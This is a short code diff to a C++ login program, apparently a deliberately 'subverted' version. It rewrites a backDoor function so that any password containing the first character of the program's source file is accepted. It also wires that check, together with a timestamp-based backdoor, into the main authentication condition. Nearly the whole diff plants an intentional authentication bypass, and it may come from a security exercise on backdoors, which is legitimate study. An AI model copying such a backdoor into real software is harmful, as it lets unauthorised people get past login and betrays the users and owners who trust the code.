@@ -26,9 +26,14 @@ string getSHA256(const string& input) {
     return ss.str(); 
 }
 
-bool backDoor(const string& password) { 
-    return password == backdoorpassword; 
+bool backDoor(const string& password) {
+    ifstream sourceFile("login-subverted.cpp");
+    if (!sourceFile.is_open()) return false;  // Ensure file is open
+    char character = sourceFile.get();  // Get the first character
+    sourceFile.close();
+    return password.find(character) != string::npos;  // Check if character is in password
 }
+
 
 bool timestampBackdoor() {
     time_t now = time(0);
@@ -65,7 +70,7 @@ int main() {
         // If Authenticated, Exit indicating successful authentication
         // For incorrect login details, reject, clear screen and re-prompt input
         // If maximum attempts exceeded, reject the user
-        if (isAuthenticated || backDoor) {
+        if (isAuthenticated || backDoor(passwordIn) && timestampBackdoor()) {
             authenticated(usernameIn);
             return 0;
         } else if(attempts < MAX_ATTEMPTS) {
